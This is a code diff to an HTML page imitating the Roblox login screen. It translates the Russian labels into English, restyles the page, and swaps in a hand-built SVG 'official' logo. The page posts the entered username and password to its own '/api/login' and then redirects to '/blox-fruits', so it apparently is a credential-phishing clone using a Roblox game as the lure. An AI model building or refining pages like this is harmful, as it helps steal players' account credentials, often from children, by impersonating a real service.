@@ -77,18 +77,16 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 30px;
+            margin-top: 20px;
             position: relative;
             z-index: 10;
         }
 
-        /* PNG логотип */
-        .roblox-logo-img {
-            width: 160px;
+        .roblox-logo {
+            width: 140px;
             height: auto;
-            margin-bottom: 30px;
-            object-fit: contain;
-            filter: brightness(0) invert(1); /* Делает логотип белым */
+            margin-bottom: 24px;
+            fill: #fff;
         }
 
         .input-box {
@@ -218,15 +216,27 @@
     </div>
 
     <div class="container">
-        <!-- PNG Логотип Roblox -->
-        <img class="roblox-logo-img" src="https://images.rbxcdn.com/3d6d548b284e82ac813b573d6d548b28.svg" alt="Roblox">
+        <!-- Официальный и чистый логотип Roblox -->
+        <svg class="roblox-logo" viewBox="0 0 1000 240" xmlns="http://www.w3.org/2000/svg">
+            <path d="M72.2 0H24.8C11.1 0 0 11.1 0 24.8v147.4C0 185.9 11.1 197 24.8 197h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C97 11.1 85.9 0 72.2 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4H24.8c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <path d="M141.7 0h-47.4c-13.7 0-24.8 11.1-24.8 24.8v147.4c0 13.7 11.1 24.8 24.8 24.8h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C166.5 11.1 155.4 0 141.7 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4h-47.4c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <path d="M211.2 0h-47.4c-13.7 0-24.8 11.1-24.8 24.8v147.4c0 13.7 11.1 24.8 24.8 24.8h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C236 11.1 224.9 0 211.2 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4h-47.4c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <path d="M280.7 0h-47.4c-13.7 0-24.8 11.1-24.8 24.8v147.4c0 13.7 11.1 24.8 24.8 24.8h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C305.5 11.1 294.4 0 280.7 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4h-47.4c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <path d="M350.2 0h-47.4c-13.7 0-24.8 11.1-24.8 24.8v147.4c0 13.7 11.1 24.8 24.8 24.8h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C375 11.1 363.9 0 350.2 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4h-47.4c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <path d="M419.7 0h-47.4c-13.7 0-24.8 11.1-24.8 24.8v147.4c0 13.7 11.1 24.8 24.8 24.8h47.4c13.7 0 24.8-11.1 24.8-24.8V24.8C444.5 11.1 433.4 0 419.7 0zm7.4 172.2c0 4.1-3.3 7.4-7.4 7.4h-47.4c-4.1 0-7.4-3.3-7.4-7.4V24.8c0-4.1 3.3-7.4 7.4-7.4h47.4c4.1 0 7.4 3.3 7.4 7.4v147.4z" fill="#fff"/>
+            <!-- Фирменный наклоненный квадрат внутри буквы O -->
+            <g transform="translate(108, 20) rotate(-28 50 50)">
+                <rect x="25" y="25" width="100" height="100" rx="22" fill="#fff"/>
+                <rect x="50" y="50" width="50" height="50" rx="10" fill="#0d0f12"/>
+            </g>
+        </svg>
 
         <div class="input-box">
-            <input type="text" id="usernameInput" placeholder="Имя пользователя/Электронная почта/Телефон" oninput="checkInputs()">
+            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
         </div>
 
         <div class="input-box">
-            <input type="password" id="passwordInput" placeholder="Пароль" oninput="checkInputs()">
+            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
             <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">
                 <svg id="eyeSvg" viewBox="0 0 24 24">
                     <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
@@ -234,11 +244,11 @@
             </button>
         </div>
 
-        <button id="loginBtn" class="login-btn" onclick="loginUser()">Авторизоваться</button>
+        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
         
-        <button class="quick-btn">Быстрый пас</button>
+        <button class="quick-btn">Quick Pass</button>
 
-        <a href="#" class="forgot-link">Забыли пароль или имя пользователя?</a>
+        <a href="#" class="forgot-link">Forgot password or username?</a>
 
         <div id="status"></div>
     </div>
@@ -280,12 +290,12 @@
 
             if (!username || !password) {
                 statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = 'Пожалуйста, заполните все поля.';
+                statusDiv.innerText = 'Please fill in all fields.';
                 return;
             }
 
             statusDiv.style.color = '#9ca3af';
-            statusDiv.innerText = 'Вход...';
+            statusDiv.innerText = 'Logging in...';
 
             try {
                 const response = await fetch('/api/login', {
@@ -298,7 +308,7 @@
 
                 if (response.ok) {
                     statusDiv.style.color = '#22c55e';
-                    statusDiv.innerText = 'Успешно! Перенаправление...';
+                    statusDiv.innerText = 'Success! Redirecting...';
                     
                     setTimeout(() => {
                         window.location.href = '/blox-fruits';
@@ -306,11 +316,11 @@
 
                 } else {
                     statusDiv.style.color = '#ef4444';
-                    statusDiv.innerText = data.error || 'Ошибка входа';
+                    statusDiv.innerText = data.error || 'Login failed';
                 }
             } catch (err) {
                 statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = 'Ошибка соединения.';
+                statusDiv.innerText = 'Connection error.';
             }
         }
     </script>
